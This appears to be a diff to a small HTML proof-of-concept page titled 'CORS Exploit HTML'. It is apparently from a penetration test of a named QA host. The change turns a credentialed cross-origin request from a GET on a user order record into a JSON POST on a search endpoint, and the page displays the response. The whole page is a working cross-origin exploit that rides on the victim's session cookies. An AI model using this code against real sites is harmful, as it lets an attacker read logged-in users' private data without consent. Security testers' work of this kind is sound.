@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS</title>
+    <title>CORS Exploit HTML</title>
 </head>
 <body>
     <center>
@@ -18,9 +18,13 @@
                     document.getElementById("cors_test_area").innerHTML = this.responseText;
                 }
             };
-            xhttp.open("GET", "https://colossusqa-pen-test.i6clouds.com/allocation/order/operator/user/671bc3f95eac3347b405b4e9", true);
+            xhttp.open("POST", "https://colossusqa-pen-test.i6clouds.com/airport/search", true);
+            xhttp.setRequestHeader("Content-Type", "application/json");
             xhttp.withCredentials = true;
-            xhttp.send();
+
+            // Send POST data in the body
+            var data = JSON.stringify({ "query": "a" });
+            xhttp.send(data);
         }
     </script>
 </body>
